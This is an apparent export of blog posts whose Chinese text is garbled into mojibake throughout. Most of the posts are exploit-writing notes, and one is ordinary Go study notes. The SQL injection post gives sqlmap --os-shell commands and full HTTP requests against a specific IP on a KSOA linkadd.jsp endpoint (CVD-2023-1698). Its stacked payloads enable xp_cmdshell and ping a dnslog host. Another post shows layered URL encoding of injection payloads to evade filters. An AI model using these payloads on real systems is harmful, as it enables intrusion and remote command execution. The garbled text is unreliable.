éªŒè¯POCéªŒè¯çš„æ—¶å€™ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œç”¨echoå­—ç¬¦ä¸²çš„æ–¹å¼æ¥è¿›è¡ŒéªŒè¯ã€‚æˆ–è€…å¯ä»¥ç”¨md5ï¼ˆ1ï¼‰è¿™ç§æ–¹å¼æ¥éªŒè¯ã€‚ä½†æ˜¯å› ä¸ºæœ‰çš„ç³»ç»Ÿæ²¡æœ‰md5.æ‰€ä»¥æ¨èç”¨echo","categories":[{"name":"å†™ exp é‡åˆ°çš„é—®é¢˜","slug":"å†™-exp-é‡åˆ°çš„é—®é¢˜","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[],"author":"Gryffinbit"},{"title":"sql æ³¨å…¥xpcmdshellç›¸å…³é—®é¢˜","slug":"sql-æ³¨å…¥xpcmdshellç›¸å…³é—®é¢˜","date":"2023-10-19T18:48:39.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/sql-æ³¨å…¥xpcmdshellç›¸å…³é—®é¢˜/","permalink":"https://gryffinbit.top/2023/10/20/sql-%E6%B3%A8%E5%85%A5xpcmdshell%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/","excerpt":"","text":"sqlæ³¨å…¥select * from master.dbo.sysobjects where xtype&#x3D;â€™xâ€™ and name&#x3D;â€™xp_cmdshellâ€™select count(*) from master.dbo.sysobjects where xtype&#x3D;â€™xâ€™ and name&#x3D;â€™xp_cmdshellâ€™ &#x2F;&#x2F; å­˜åœ¨è¿”å›1 1python .\\sqlmap.py -r .\\point.txt --proxy sock5://127.0.0.1:7890 ponit.txt çš„å†…å®¹ id&#x3D;666666 æ˜¯æ³¨å…¥ç‚¹çš„ä½ç½®ï¼Œ* ä»£è¡¨ä¼˜å…ˆä»è¿™é‡Œå¼€å§‹ 123456GET /linksframe/linkadd.jsp?id=666666* HTTP/1.1Host: 1.196.238.71:93User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15Accept-Encoding: gzip, deflateConnection: close SQLmapçš„è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®åº“æ˜¯ä»€ä¹ˆï¼Œæ¯”å¦‚æ˜¯Microsoft SQl Server ï¼ˆä¹Ÿå°±æ˜¯mssqlï¼‰ 1python .\\sqlmap.py -r .\\point.txt --proxy socks5://127.0.0.1:7890 --os-shell é€šè¿‡è¿™ä¸ªè¯­å¥ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰shellå¯ä»¥æ¡ 1python .\\sqlmap.py -r .\\point.txt --proxy socks5://127.0.0.1:7890 --sql-shell é€šè¿‡è¿™ä¸ªè¯­å¥ï¼Œå¯ä»¥æ‹¿åˆ°sqlshellï¼Œæ‰§è¡Œsqlè¯­å¥ã€‚ 1http://1.196.238.71:93/linksframe/linkadd.jsp?id=666666&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;-- 1GET /linksframe/linkadd.jsp?id=666666&#x27; union all select 9af,null,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;GRYFF&#x27;)),null,null,&#x27;33&#x27;;WAITFOR DELAY &#x27;0:0:4 HTTP/1.1 é€šè¿‡è¿™ç§æ–¹å¼ï¼Œçœ‹èƒ½å¦å †å æ³¨å…¥ã€‚ åœ¨sqlshell é‡Œé¢æŸ¥çœ‹æ˜¯å¦å¼€å¯xpcmdshell 12select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27; // å­˜åœ¨è¿”å›1 ä¹‹æ‰€ä»¥è¦å †å æ³¨å…¥çš„åŸå› ï¼Œæ˜¯å› ä¸ºéœ€è¦å¼€å¯xpcmdshellï¼Œä»–éœ€è¦å…ˆå¼€å¯ï¼Œç„¶åå†ä¿å­˜é…ç½®ã€‚ 123456&#x27; union all select 9af,null,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;GRYFF&#x27;)),null,null,null;exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;exec master..xp_cmdshell &#x27;ping 6byyxc.dnslog.cn sys.fn_sqlvarbasetostr çš„ä½œç”¨æ˜¯èƒ½è®©md5å›æ˜¾ã€‚ ç»“å°¾éœ€è¦æ³¨é‡Š 12345678910111213141516171819 GET /linksframe/linkadd.jsp?id=666666&#x27;%20union%20all%20select%209af%2cnull%2csys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;%2c&#x27;GRYFF&#x27;))%2cnull%2cnull%2cnull%3bexec%20sp_configure%20&#x27;show%20advanced%20options&#x27;%2c%201%3breconfigure%3bEXEC%20sp_configure%20&#x27;xp_cmdshell&#x27;%2c1%3bRECONFIGURE%3b%20--%20 HTTP/1.1Host: 1.196.238.71:93 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflateConnection: close GET /linksframe/linkadd.jsp?id=666666&#x27;%20union%20all%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%3bEXEC%20sp_configure%20&#x27;show%20advanced%20options&#x27;%2c1%3bRECONFIGURE%3bEXEC%20sp_configure%20&#x27;xp_cmdshell&#x27;%2c1%3bRECONFIGURE%3b%20-- HTTP/1.1Host: 1.196.238.71:93 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflateConnection: close GET /linksframe/linkadd.jsp?id=666666&#x27;%20union%20all%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%3bCREATE%20TABLE%20cmdtmp%20(dir%20varchar(8000))%3b--%20 HTTP/1.1Host: 1.196.238.71:93 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflateConnection: close è€Œä¸”æœ‰æ—¶sqlæ³¨å…¥ï¼Œå¿…é¡»å¸¦ä¸Šå‰é¢çš„æŸ¥è¯¢ç»“æœï¼ˆselecté‚£éƒ¨åˆ†ï¼‰ æ­¤æ¬¡sqlæ³¨å…¥æ¡ˆä¾‹åŸå‹ï¼š ã€9.6 ä¾‹è¡Œä¼˜åŒ–ã€‘ã€sqlå‡çº§rceæ¨¡æ¿ã€‘ç”¨å‹ KSOA linkadd.jsp sql æ³¨å…¥ï¼ˆCVD-2023-1698ï¼‰.go","categories":[{"name":"å†™ exp é‡åˆ°çš„é—®é¢˜","slug":"å†™-exp-é‡åˆ°çš„é—®é¢˜","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"xpcmdshell","slug":"xpcmdshell","permalink":"https://gryffinbit.top/tags/xpcmdshell/"}],"author":"Gryffinbit"},{"title":"URL ç¼–ç é—®é¢˜","slug":"URL-ç¼–ç é—®é¢˜","date":"2023-10-19T18:38:13.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/10/20/URL-ç¼–ç é—®é¢˜/","permalink":"https://gryffinbit.top/2023/10/20/URL-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/","excerpt":"","text":"æ¼æ´å½•å…¥ã€Šå®æ™¯äººåŠ›èµ„æºä¿¡æ¯ç®¡ç†ç³»ç»Ÿ codesettree æ¥å£ SQL æ³¨å…¥æ¼æ´ã€‹ï¼Œæ±²å–çš„çµæ„Ÿã€‚ é‚£ä¸ªç¼–ç ï¼Œå¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œç”¨ç™¾åˆ†å·+åå…­è¿›åˆ¶çš„éªšæ–¹æ³•ã€‚ã€‚ã€‚ã€‚å…ˆæ™®é€šurlä¸€æ¬¡ä¹‹åï¼Œå†å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦ç¼–ç ã€‚ä»–ä¸æ˜¯ç®€å•çš„å¤šæ¬¡urlç¼–ç ã€‚è¿™æ˜¯å¦ä¸€ç§urlç¼–ç ã€‚å«encodeURIComponentï¼Œè¿™æ˜¯javaä¸­çš„ä¸€ä¸ªç±»ã€‚ javaå¯¹urlç¼–ç æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ä¸ªæ˜¯encodeURIï¼Œä¸€ä¸ªæ˜¯encodeURIComponent ç„¶åæˆ‘å‘ç°ï¼ŒencodeURIçš„æ–¹å¼ï¼Œå°±ä¸ä¼šè§£ç %2Cã€‚ä¹Ÿå°±æ˜¯ä¸ä¼šå¯¹ï¼Œè¿™äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç  URL Decode Online | URLDecoder ä¸€ä¸ªå®ä¾‹11&#x27; union all select 849754578,(select @@VERSION) -- è¿›è¡Œç¬¬ä¸€æ¬¡urlç¼–ç ï¼Œæ•´ä½“ç¼–ç ã€‚URL Encode Online | URLEncoder 11%27%20union%20all%20select%20849754578%2C%28select%20%40%40VERSION%29%20-- ä¼šå‘ç°ï¼Œæ•°å­—éƒ¨åˆ†ä»¥åŠ--éƒ¨åˆ†æ²¡æœ‰è¢«ç¼–ç ï¼Œæ‰€ä»¥éœ€è¦æ‰¾16è¿›åˆ¶å¯¹åº”çš„éƒ¨åˆ†ï¼ŒåŠ ä¸Š%ï¼Œå†æ¬¡ç¼–ç  1%31%27%20union%20all%20select%20%38%34%39%37%35%34%35%37%38%2C%28select%20%40%40VERSION%29%20%2d%2d æœ‰å¿…è¦çš„è¯ï¼Œè¿˜éœ€è¦å°†%æ¢æˆ~ 1~31~27~20union~20all~20select~20~38~34~39~37~35~34~35~37~38~2c~28select~20~40~40VERSION~29~20~2d~2d ç„¶åè¿™ä¸€ä¸²ï¼Œå°±å¯ä»¥å»getï¼Œåœ¨burpå‘é€æ•°æ®åŒ…äº† å¤šæ¬¡urlç¼–ç å®ä¾‹å¤šæ¬¡ url ç¼–ç ï¼Œæ˜¯å¤šæ¬¡16è¿›åˆ¶çš„ç¼–ç  æœ€ç»ˆç¼–ç ç»“æœ 1%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%39%25%32%35%25%33%37%25%33%33%25%32%35%25%33%32%25%36%35%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%35%25%36%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%31%25%32%35%25%33%36%25%36%33%25%32%35%25%33%37%25%33%36%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%32%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%34%25%33%38%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%38%25%32%35%25%33%34%25%33%32%25%32%35%25%33%37%25%33%39%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%32%25%33%37%25%32%35%25%33%34%25%36%34%25%32%35%25%33%34%25%33%34%25%32%35%25%33%33%25%33%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31%25%32%35%25%33%33%25%33%32%25%32%35%25%33%33%25%33%33%25%32%35%25%33%33%25%33%34%25%32%35%25%33%33%25%33%35%25%32%35%25%33%33%25%33%36%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31 è§£ç ä¸€æ¬¡ 1%25%33%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%36%25%36%65%25%35%66%25%37%33%25%37%31%25%36%63%25%37%36%25%36%31%25%37%32%25%36%32%25%36%31%25%37%33%25%36%35%25%37%34%25%36%66%25%37%33%25%37%34%25%37%32%25%32%38%25%34%38%25%36%31%25%37%33%25%36%38%25%34%32%25%37%39%25%37%34%25%36%35%25%37%33%25%32%38%25%32%37%25%34%64%25%34%34%25%33%35%25%32%37%25%32%63%25%32%37%25%33%31%25%33%32%25%33%33%25%33%34%25%33%35%25%33%36%25%32%37%25%32%39%25%32%39%25%32%39%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%33%31 è§£ç ä¸¤æ¬¡ 1%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%73%65%6c%65%63%74%20%73%79%73%2e%66%6e%5f%73%71%6c%76%61%72%62%61%73%65%74%6f%73%74%72%28%48%61%73%68%42%79%74%65%73%28%27%4d%44%35%27%2c%27%31%32%33%34%35%36%27%29%29%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%27%31 è§£ç ä¸‰æ¬¡ 11&#x27; union select 1%2c(select sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;%2c&#x27;123456&#x27;))) union select 1%2c&#x27;1 åŸå§‹payload 11&#x27; union select 1,(select sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;123456&#x27;))) union select 1,&#x27;1 æ­£å‘ç¼–ç å®ä¾‹æ³¨æ„ï¼æ¯ä¸€æ¬¡ç¼–ç è¿‡åï¼ŒåŸæœ¬çš„ç‰¹æ®Šå­—ç¬¦ç¼–ç ï¼Œä¸è¦å†æ¬¡ç¼–ç ï¼Œæ¯”å¦‚,æ˜¯%2cï¼Œä¸è¦å¯¹ä»–è¿›è¡Œé‡å¤ç¼–ç ã€‚ åŸå§‹ payload 11&#x27; union select 1,(select @@VERSION) union select 1,&#x27;1 å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç  11&#x27; union select 1%2c(select %40%40VERSION) union select 1%2c&#x27;1 ç¬¬ä¸€æ¬¡ç¼–ç  hexä¹‹åï¼Œåœ¨å‰é¢åŠ ç™¾åˆ†å·ï¼Œæ­£åˆ™åŒ¹é…ã€findï¼š(..) replaceï¼š%\\1ã€‘ æ³¨æ„ï¼Œ%2c %40ä¸ç¼–ç  1%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%73%65%6c%65%63%74%20%40%40%56%45%52%53%49%4f%4e%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%27%31 ç¬¬äºŒæ¬¡ç¼–ç  ç›´æ¥æŠŠä¸Šé¢é‚£æ®µï¼Œæ”¾è¿›hexä¹‹åï¼ŒåŠ %å°±å¯ä»¥ 16è¿›åˆ¶è½¬æ¢ï¼Œ16è¿›åˆ¶è½¬æ¢æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œåœ¨çº¿16è¿›åˆ¶è½¬æ¢ | åœ¨çº¿å·¥å…· (sojson.com) 1%25%33%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%66%25%34%65%25%32%39%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%33%31 ç¬¬ä¸‰æ¬¡ç¼–ç  ä¸¢è¿›hex 1%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31","categories":[{"name":"å†™ exp é‡åˆ°çš„é—®é¢˜","slug":"å†™-exp-é‡åˆ°çš„é—®é¢˜","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"URL","slug":"URL","permalink":"https://gryffinbit.top/tags/URL/"}],"author":"Gryffinbit"},{"title":"Macä¸Šé‡åˆ°çš„ç¯å¢ƒé—®é¢˜è®°å½•","slug":"Macä¸Šé‡åˆ°çš„ç¯å¢ƒé—®é¢˜è®°å½•","date":"2023-07-14T18:03:58.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/07/15/Macä¸Šé‡åˆ°çš„ç¯å¢ƒé—®é¢˜è®°å½•/","permalink":"https://gryffinbit.top/2023/07/15/Mac%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Golandè®¾ç½®ä»£ç†","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"Goland","slug":"Goland","permalink":"https://gryffinbit.top/tags/Goland/"},{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/tags/Golang/"}],"author":"Gryffinbit"},{"title":"Goè¯­è¨€å­¦ä¹ è®°å½•","slug":"Goè¯­è¨€å­¦ä¹ è®°å½•","date":"2023-07-14T11:24:15.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/07/14/Goè¯­è¨€å­¦ä¹ è®°å½•/","permalink":"https://gryffinbit.top/2023/07/14/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Go è¯­è¨€ç»“æ„ åŒ…å£°æ˜ å¼•å…¥åŒ… å‡½æ•° å˜é‡ è¯­å¥&amp;è¡¨è¾¾å¼ æ³¨é‡Š å¯ä»¥é€šè¿‡go runæŒ‡ä»¤ï¼Œç›´æ¥è¿è¡Œ.goæ–‡ä»¶ã€‚ å¯ä»¥é€šè¿‡go buildæŒ‡ä»¤ï¼Œç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ Goä¸­ï¼Œ&#123;ä¸èƒ½å•ç‹¬ä¸€è¡Œ GoåŸºç¡€è¯­æ³•æ ‡è¯†ç¬¦æ ‡è¯†ç¬¦ç”¨æ¥å‘½åå˜é‡ã€ç±»å‹ç­‰ç¨‹åºå®ä½“ã€‚ä¸€ä¸ªæ ‡è¯†ç¬¦å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæˆ–æ˜¯å¤šä¸ªå­—æ¯(AZå’Œaz)æ•°å­—(0~9)ã€ä¸‹åˆ’çº¿_ç»„æˆçš„åºåˆ—ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯å­—æ¯æˆ–ä¸‹åˆ’çº¿è€Œä¸èƒ½æ˜¯æ•°å­—ã€‚ å¹¶ä¸”ä¸èƒ½ä½¿ç”¨å…³é”®å­—å‘½åã€‚ ä»¥ä¸‹æ˜¯æœ‰æ•ˆçš„æ ‡è¯†ç¬¦ï¼š 1a_123 _temp j ä»¥ä¸‹æ˜¯æ— æ•ˆçš„æ ‡è¯†ç¬¦ï¼š 1abï¼ˆä»¥æ•°å­—å¼€å¤´ï¼‰ caseï¼ˆGo è¯­è¨€çš„å…³é”®å­—ï¼‰ a+bï¼ˆè¿ç®—ç¬¦æ˜¯ä¸å…è®¸çš„ï¼‰ å…³é”®å­— å­—ç¬¦ä¸²è¿æ¥ç”¨åŠ å·ç›´æ¥è¿æ¥ 12345package mainimport &quot;fmt&quot;func main()&#123; fmt.Println(&quot;Gryffinbit&quot;+&quot;awesome&quot;)&#125; æ ¼å¼åŒ–å­—ç¬¦ä¸²Go è¯­è¨€ä¸­ä½¿ç”¨ fmt.Sprintf æˆ– fmt.Printf æ ¼å¼åŒ–å­—ç¬¦ä¸²å¹¶èµ‹å€¼ç»™æ–°ä¸²ï¼š Sprintf æ ¹æ®æ ¼å¼åŒ–å‚æ•°ç”Ÿæˆæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å¹¶è¿”å›è¯¥å­—ç¬¦ä¸²ã€‚ Printf æ ¹æ®æ ¼å¼åŒ–å‚æ•°ç”Ÿæˆæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å¹¶å†™å…¥æ ‡å‡†è¾“å‡ºã€‚ Sprintf å®ä¾‹ æœ‰ä¸€ç§â€œå¡«å…¥â€çš„æ„Ÿè§‰ï¼ŒæŠŠå·²ç»æœ‰äº†çš„å˜é‡ï¼Œå¡«å…¥åˆ°%dã€%sä¸­å»ã€‚ä½†æƒ³è¦æ˜¾ç¤ºå‡ºè¿”å›ç»“æœçš„æ—¶å€™ä¸èƒ½ç›´æ¥ç”¨ï¼Œä»–ä¸èƒ½è‡ªå·±å»â€œæ˜¾ç¤ºç»“æœâ€ï¼Œéœ€è¦å€ŸåŠ©printå‡½æ•°æ‰å¯ä»¥æ‰“å°å‡ºæ¥ Printfå®ä¾‹ èƒ½å¤ŸåƒSprintfä¸€æ ·ï¼Œè¿”å›å­—ç¬¦ä¸²ï¼ˆå¡«å…¥çš„æ„Ÿè§‰ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥è°ƒç”¨æ¥æ‰“å°å‡ºç»“æœï¼Œæ˜¾ç¤ºå‡ºæ¥ã€‚å³å¯ä»¥å†™å…¥è¾“å‡º Goè¯­è¨€æ•°æ®ç±»å‹ Goè¯­è¨€å˜é‡å˜é‡å£°æ˜ æŒ‡å®šå˜é‡ç±»å‹ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆ™å˜é‡é»˜è®¤ä¸ºé›¶å€¼ã€‚ 1var v_name v_type 12345678910111213141516package mainimport &quot;fmt&quot;func main() &#123; // å£°æ˜ä¸€ä¸ªå˜é‡å¹¶åˆå§‹åŒ– var a = &quot;RUNOOB&quot; fmt.Println(a) // æ²¡æœ‰åˆå§‹åŒ–å°±ä¸ºé›¶å€¼ var b int fmt.Println(b) // bool é›¶å€¼ä¸º false var c bool fmt.Println(c)&#125; ä»¥ä¸‹ç±»å‹ä¸ºnil 123456var a *intvar a []intvar a map[string] intvar a chan intvar a func(string) intvar a error // error æ˜¯æ¥å£ æ ¹æ®å€¼ï¼Œè‡ªè¡Œåˆ¤æ–­å˜é‡ç±»å‹ 1var v_name = value ä¸èƒ½ç”¨:=é‡å¤å£°æ˜å˜é‡ æ­£ç¡®çš„ä½¿ç”¨ï¼š 1v_name := value éæ­£ç¡®çš„ä½¿ç”¨ï¼ˆé‡å¤å£°æ˜ï¼‰ï¼š 12var v_name intv_name := 1 å¤šå˜é‡å£°æ˜1. ä½¿ç”¨æŒ‡å®šå˜é‡çš„æ–¹å¼ 12var v_name1,v_name2,v_name3 typev_name1,v_name2,v_name3 = v1, v2,v3 2. ä½¿ç”¨è‡ªåŠ¨æ¨æ–­çš„æ–¹æ³• 1var v_name1,v_name2,v_name3 = v1,v2,v3 3. :=å£°æ˜å˜é‡ 1v_name1,v_name2,v_name2 := v1,v2,v3 4. å…¨å±€å˜é‡çš„å£°æ˜ 12345var ( v_name1 type v_name2 type) ç©ºç™½æ ‡è¯†ç¬¦ç©ºç™½æ ‡è¯†ç¬¦ _ ä¹Ÿè¢«ç”¨äºæŠ›å¼ƒå€¼ï¼Œå¦‚å€¼ 5 åœ¨_, b = 5, 7 ä¸­è¢«æŠ›å¼ƒã€‚ _ å®é™…ä¸Šæ˜¯ä¸€ä¸ªåªå†™å˜é‡ï¼Œä½ ä¸èƒ½å¾—åˆ°å®ƒçš„å€¼ã€‚è¿™æ ·åšæ˜¯å› ä¸º Go è¯­è¨€ä¸­ä½ å¿…é¡»ä½¿ç”¨æ‰€æœ‰è¢«å£°æ˜çš„å˜é‡ï¼Œä½†æœ‰æ—¶ä½ å¹¶ä¸éœ€è¦ä½¿ç”¨ä»ä¸€ä¸ªå‡½æ•°å¾—åˆ°çš„æ‰€æœ‰è¿”å›å€¼ã€‚ Goè¯­è¨€å¸¸é‡ä½¿ç”¨constå…³é”®å­—è¿›è¡Œåˆ›å»ºã€‚ åŒæ ·ä½¿ç”¨ä¸Šè¿°çš„ä¸¤ç§å£°æ˜ç±»å‹ï¼Œæ˜¾å¼å£°æ˜ç±»å‹å’Œéšå¼å£°æ˜ç±»å‹ã€‚ ç‰¹æ®Šå¸¸é‡ï¼šiota å¯ä»¥è®¤ä¸ºå¼ä¸€ä¸ªå¯ä»¥è¢«ç¼–è¯‘å™¨ä¿®æ”¹çš„å¸¸é‡ã€‚ iota åœ¨ constå…³é”®å­—å‡ºç°æ—¶å°†è¢«é‡ç½®ä¸º 0(const å†…éƒ¨çš„ç¬¬ä¸€è¡Œä¹‹å‰)ï¼Œconst ä¸­æ¯æ–°å¢ä¸€è¡Œå¸¸é‡å£°æ˜å°†ä½¿ iota è®¡æ•°ä¸€æ¬¡(iota å¯ç†è§£ä¸º const è¯­å¥å—ä¸­çš„è¡Œç´¢å¼•)ã€‚ 